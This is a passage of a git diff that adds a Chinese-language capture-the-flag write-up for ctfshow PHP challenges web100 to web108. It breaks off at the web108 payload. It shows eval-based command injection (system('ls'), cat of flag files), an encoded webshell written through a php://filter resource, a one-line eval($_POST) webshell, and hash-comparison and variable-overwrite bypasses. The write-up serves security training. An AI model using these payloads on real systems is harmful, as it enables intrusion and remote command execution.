@@ -4022,3 +4022,520 @@ content=<?php eval($_POST[1]);?>
 
 ---
 
+### web100
+
+```php
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\;/", $v2)){
+        if(preg_match("/\;/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
+
+
+?> 
+```
+
+一共需要传三个get参数，然后`$v0`是对三个参数的与的结果，了解一下`is_numeric()`函数
+
+**is_numeric()** 函数用于检测变量是否为数字或数字字符串
+ 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE
+
+![image-20240509084556843](image/image-20240509084556843.png)
+
+但php有运算的优先级，也就是`&&> = > and`
+
+所以这段代码就是先执行`$v0=is_numeric($v1)`
+
+and后面的无论真假都可以运行
+
+所以对v1传入数字就可以，
+
+`if(!preg_match("/\;/", $v2))`
+
+想要过这个就需要v2里没有分号
+
+相同的下一个if就需要v3里有分号
+
+再看最后一句
+
+`eval("$v2('ctfshow')$v3")`
+
+这里他给定了一个参数，我们可以配合v3把参数注视掉
+
+根据提示
+
+```
+flag in class ctfshow; 
+```
+
+方法一：查看文件
+
+payload
+
+```
+?v1=1&v2=system("ls")/*&v3=*/;
+?v1=1&v2=system("cat ctfsh*")/*&v3=*/;
+```
+
+方法二：调用类
+
+```
+?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
+```
+
+最后得到的flag 
+
+```
+flag_is_ce049b670x2dc58a0x2d46330x2d9f180x2d42c5d1e55d8f
+```
+
+将0x2d需要替换成`-`
+
+发现少了一位，对最后一位进行爆破
+
+---
+
+### web101
+
+```php
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
+        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
+
+?> 
+```
+
+前面还是一样，对v2和v3的要求变多了
+
+要求v2只能是字母和部分符号
+
+这题考察[类反射](https://blog.csdn.net/joshua317/article/details/120186644)
+
+```
+PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。
+$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类
+$instance = $class->newInstanceArgs($args); // 相当于实例化ctfshow类
+```
+
+payload为
+
+```
+?v1=1&v2=echo new ReflectionClass&v3=;
+```
+
+得到flag
+
+![image-20240509091545410](image/image-20240509091545410.png)
+
+---
+
+### web102
+
+```php
+
+highlight_file(__FILE__);
+$v1 = $_POST['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v4 = is_numeric($v2) and is_numeric($v3);
+if($v4){
+    $s = substr($v2,2);
+    $str = call_user_func($v1,$s);
+    echo $str;
+    file_put_contents($v3,$str);
+}
+else{
+    die('hacker');
+}
+
+
+?> 
+```
+
+这里换成了判断v2是不是数字
+
+然后出现了两个新函数
+
+![image-20240509092220004](image/image-20240509092220004.png)
+
+![image-20240509092344110](image/image-20240509092344110.png)
+
+这里对`is_numeric`函数进行补充一点，如果字符串中含有一个e代表科学计数法，也可返回true
+
+首先，get传参v2和v3，post传参v1；if中需要v4为真才能往下执行，而v4要为真就是v2传的参数要
+
+为数字或者数字字符串，同时v2也是我们要写入的webshell
+
+ 为了让v2为数字或者数字字符串，我们可以先把我们的webshell转换为base64编码，再把base64
+
+编码转换为16进制
+
+```php
+<?php
+
+$b = base64_encode('<?=`tac *`;');
+$b = str_replace("=", "", $b);
+echo "base64加密后:" . $b . "\n";
+$v2 = call_user_func('bin2hex', $b);
+echo "16进制形式:" . $v2 . "\n";
+var_dump(is_numeric($v2));
+
+
+```
+
+![image-20240509094134877](image/image-20240509094134877.png)
+
+所以我们构造出来的经过base64加密，然后在转16进制的数只能包含数字和e
+
+由于v2是从第三位开始取值，所以要在v2数字前面加上00
+
+构建命令
+
+```
+?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
+
+post:
+v1=hex2bin
+```
+
+访问1.php得到flag
+
+![image-20240509094721226](image/image-20240509094721226.png)
+
+---
+
+### web103
+
+```php
+highlight_file(__FILE__);
+$v1 = $_POST['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v4 = is_numeric($v2) and is_numeric($v3);
+if($v4){
+    $s = substr($v2,2);
+    $str = call_user_func($v1,$s);
+    echo $str;
+    if(!preg_match("/.*p.*h.*p.*/i",$str)){
+        file_put_contents($v3,$str);
+    }
+    else{
+        die('Sorry');
+    }
+}
+else{
+    die('hacker');
+}
+
+?> 
+```
+
+和上一题一样，这次对于$str多过滤了php，但是我们上一题的v2是经过base64编码的所以不存在问题
+
+继续套用
+
+```
+?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
+
+post:
+v1=hex2bin
+```
+
+访问1.php得到flag
+
+![image-20240509100959448](image/image-20240509100959448.png)
+
+---
+
+### web104
+
+```php
+highlight_file(__FILE__);
+include("flag.php");
+
+if(isset($_POST['v1']) && isset($_GET['v2'])){
+    $v1 = $_POST['v1'];
+    $v2 = $_GET['v2'];
+    if(sha1($v1)==sha1($v2)){
+        echo $flag;
+    }
+}
+
+
+
+?> 
+```
+
+对比v1和v2的sha1值
+
+sha1()函数无法处理数组类型，会返回NULL
+
+构建payload
+
+```
+?v2[]=1
+
+post
+v1[]=1
+```
+
+得到flag
+
+![image-20240509102627112](image/image-20240509102627112.png)
+
+---
+
+### web105
+
+```php
+highlight_file(__FILE__);
+include('flag.php');
+error_reporting(0);
+$error='你还想要flag嘛？';
+$suces='既然你想要那给你吧！';
+foreach($_GET as $key => $value){
+    if($key==='error'){
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}foreach($_POST as $key => $value){
+    if($value==='flag'){
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}
+if(!($_POST['flag']==$flag)){
+    die($error);
+}
+echo "your are good".$flag."\n";
+die($suces);
+
+?> 
+```
+
+```php
+例如:
+foreach($ary as $key=>$value){     //$ary的键名赋给$key，键值赋给$value
+	$$key=$value;    //把键值赋给$$key
+```
+
+这里利用的是[变量覆盖](https://blog.csdn.net/qq_45089570/article/details/104858285)，关键点在$$key=$$value，这里把$key的值当作了变量
+
+```
+例如 $key=flag  则$$key=$flag
+```
+
+这里一共有三个变量，$error、$suces和$flag；这里通过die($error)或者die($suces)都可以输出flag，所以有两个payload
+ **第一种：**
+ 通过die($error)输出flag
+
+首先我们把$flag的值传给$1，接着再把$1的值传给$error，
+
+$error的值就是flag，再通过if判断die输出就是flag
+
+ 例如
+
+$flag=ctfshow{xxxxx}，
+
+?1=flag，
+
+通过第一个for循环，
+
+也就是$1=$flag，
+
+$1=ctfshow{xxxxx}，
+
+接着再通过第二个for循环，
+
+$error=$1，
+
+此时$error=ctfshow{xxxxx}
+
+```
+?1=flag
+
+post:
+error=1
+```
+
+![image-20240509105353624](image/image-20240509105353624.png)
+
+**第二种：**
+ 通过die($suces)输出flag
+
+首先我们把flag的值传给suces变量，接着再把flag的值给置空，
+
+已达到下面if条件为0不执行的目的，往下执行，
+
+die($suces)即可把flag输出
+
+```
+?suces=flag&flag=
+```
+
+![image-20240509105412313](image/image-20240509105412313.png)
+
+---
+
+### web106
+
+```php
+highlight_file(__FILE__);
+include("flag.php");
+
+if(isset($_POST['v1']) && isset($_GET['v2'])){
+    $v1 = $_POST['v1'];
+    $v2 = $_GET['v2'];
+    if(sha1($v1)==sha1($v2) && $v1!=$v2){
+        echo $flag;
+    }
+}
+
+
+
+?> 
+```
+
+典型的值不相等sha1相等，使用数组绕过
+
+payload
+
+```
+?v2[]=1
+
+post
+v1[]=2
+```
+
+得到flag
+
+![image-20240509105936702](image/image-20240509105936702.png)
+
+---
+
+### web107
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+if(isset($_POST['v1'])){
+    $v1 = $_POST['v1'];
+    $v3 = $_GET['v3'];
+       parse_str($v1,$v2);
+       if($v2['flag']==md5($v3)){
+           echo $flag;
+       }
+
+}
+
+
+
+?> 
+```
+
+有一个新函数 parse_str
+
+![image-20240509110311309](image/image-20240509110311309.png)
+
+例如
+
+```php
+$a = "name=freedom&age=666";
+parse_str($a,$b);
+echo $b['name']."\n";
+echo $b['age'];
+
+#输出结果
+//freedom
+//666
+
+如果$a为空，那么$b['name']的输出也为空就是null
+```
+
+知道md5无法处理数组，如果传入数组返回结果为null
+
+那么等式成立
+
+构建payload
+
+```
+?v3[]=
+
+post
+v1=
+```
+
+得到flag
+
+![image-20240509112454364](image/image-20240509112454364.png)
+
+---
+
+### web108
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
+    die('error');
+
+}
+//只有36d的人才能看到flag
+if(intval(strrev($_GET['c']))==0x36d){
+    echo $flag;
+}
+
+?>
+```
+
+出现几个新函数
+
+```
+ereg() 
+函数搜索由指定的字符串，如果发现返回true，否则返回false。字母区分大小写
+
+strrev() 
+函数反转字符串。
+
+intval() 
+函数用于获取变量的整数值
+```
+
+%00可以截断ereg()函数的搜索，正则表达式只会匹配%00之前的内容；
+
+0x36d的十进制为877，
+
+我们需要字母在前来跳过if语句，接着再进行字符串的反转得到877a
+
+intval()函数取整数部分得到877
+
+payload
+
